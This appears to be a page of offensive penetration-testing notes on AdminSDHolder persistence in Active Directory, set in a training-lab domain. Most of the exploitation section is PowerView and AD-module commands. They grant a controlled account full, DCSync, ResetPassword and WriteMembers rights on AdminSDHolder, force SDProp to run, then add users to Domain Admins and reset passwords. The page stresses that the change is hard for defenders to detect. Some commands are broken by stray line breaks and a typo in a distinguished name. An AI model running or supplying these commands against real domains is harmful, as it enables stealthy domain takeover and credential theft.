# AdminSDHolder

AdminSDHolder is a system container that used to control permissions.\
These permissions are used as a template for protected accounts to prevent modifications to them.&#x20;

Security Descriptor Propagator (SDPROP) runs every 60 minutes.\
SDPROP compares between the ACL of the protected groups and members and the ACL of AdminSDHolder, then any differences are overwritten on the ACL Object.

Hence when we get Domain Admin access even if we add ACL's to a user that we control, after an hour the SDPROP will rewrite the ACL's of the domain admin's group and our user's DA ACL's will be deleted.

So to exploit this we'll be adding ACL to the AdminSDHolder itself which will propagate the ACLs to all the protected groups for us.

There aren't any special logs that are generated when changes to the AdminSDHolder ACL's is made, making it difficult for the blue team to detect.

<details>

<summary>Protected Groups</summary>

* Account Operators
* Backup Operators
* Server Operators
* Print Operators
* Domain Admins
* Replicator
* Enterprise Admins
* Domain Controllers
* Read only Domain Controllers
* Schema Admins
* Administrators

</details>

* All below can log on locally to DC: - Commonly abused protected groups
  * Account Operators - Cannot modify DA/EA/BA Groups. Can modify nested group within these groups
  * Backup Operators - Backup GPO, edit to add SID of controlled account to a privileged group and restore
  * Server Operators - Run a command as system (using the disabled browser service)
  * Print Operators - Copy ntds.dit backup, load device drivers

## Exploitation

An attacker can utilize SDROP mechanism by adding a user with GenericAll privileges\
to theAdminSD Holder object.\
\
When the SDPROP runs (every 60 minutes) the user will be add with elevated privileges.

Adding user to the AdminSDHolder object

{% code overflow="wrap" %}
```powershell
# Full privs
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dcdollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Reset Password priv
Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc
al' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Write Members priv
Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc
al' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# DC Sync priv
Add-DomainObjectAcl -TargetIdentity
'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc
al' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```
{% endcode %}

Run SDProp manually

{% embed url="https://github.com/theyoge/AD-Pentesting-Tools/blob/main/Invoke-SDPropagator.ps1" %}

```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

# pre-Server 2008 machines
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

## Abusing rights

{% tabs %}
{% tab title="PowerView" %}
```powershell
# Add user to DA group
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose

# Reset Password
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
# Add user to DA group
Add-ADGroupMember -Identity 'Domain Admins' -Members testda

# Reset Password
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```
{% endtab %}
{% endtabs %}
